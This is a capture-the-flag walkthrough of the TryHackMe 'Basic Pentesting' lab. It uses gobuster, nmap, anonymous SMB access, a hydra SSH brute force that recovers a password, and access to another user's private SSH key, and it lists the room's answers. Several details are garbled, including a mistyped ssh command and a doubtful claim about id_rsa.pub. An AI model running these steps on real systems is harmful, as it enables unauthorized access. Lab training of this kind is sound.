# [Basic Pentesting - THM](https://tryhackme.com/room/basicpentestingjt)

In these set of tasks you'll learn the following:

**Brute forcing** 

**Hash cracking**

**Service enumeration**

**Linux Enumeration**

The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file.

---------------

# Scanning Steps :

## STEP 1 :

**NO Robots.txt FOUND**

Checking Source Code

```html

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->
```

**Check our dev note** There is a **hidden** path.


## STEP 2 :

Scanning Paths

```bash
gobuster -u $IP -w x.txt
```
Gobuster output

```bash
2022/02/23 16:18:09 Starting gobuster
=====================================================
/development (Status: 301)
```


1) What is the name of the hidden directory on the web server(enter name without /)?

**development**

Found txt files :

```html
	Parent Directory	 	- 	 
[TXT]	dev.txt	2018-04-23 14:52 	483 	 
[TXT]	j.txt
```

**dev.txt** Contains **Sensitive information**

```text
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

**SMB** - **APACHE** - **REST** - **VERSION 2.5.12**


## STEP 2 :

Scanning Open Ports

```bash
nmap -sV -sC $IP
```

Nmap output

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-02-23T10:07:53-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-23T15:07:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.39 seconds
```

There is **SMB** Open for **Guest** / **Anonymous**

```bash
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

---------

# Exploiting Steps :

## STEP 1 :

Trying to connect to **SMBCLIENT** as **Anonymous**

```bash
smbclient \\\\10.10.76.147\\anonymous

smb: \> ls
  .                                   D        0  Thu Apr 19 18:31:20 2018
  ..                                  D        0  Thu Apr 19 18:13:06 2018
  staff.txt                           N      173  Thu Apr 19 18:29:55 2018

```

Found **staff.txt** contains username **jan**

```bash
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

## STEP 2 :

**BruteForcing** the **SSH** with username **jan** as we now in **staff.txt** file he uses a **weak password**

```bash
hydra -f -l jan -P rockyou.txt ssh://$IP

[22][ssh] host: 10.10.76.147   login: jan   password: armando
```
2) What is the password? 

**armando**

## STEP 3 :

3) What service do you use to access the server(answer in abbreviation in all caps)?

**SSH**


Connecting to **SSH**

```bash
ssh jan@10.10.76.147
$ cd home/kay
$ ls -la
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
```


3) What is the name of the other user you found(all lower case)?

**kay**

## STEP 4 :

Accessing **.ssh**

```bash
$ cd .ssh
$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

**id_rsa** is private key for **kay**

**id_rsa.pub** contains **md5-password** & new user **jackob**

## STEP 5 :

Connecting with **rsa** and **password**

```bash
ssh -i rsa_id kan@$IP

$ cat pass.bak
```

**FOUND THE PASSWORD**
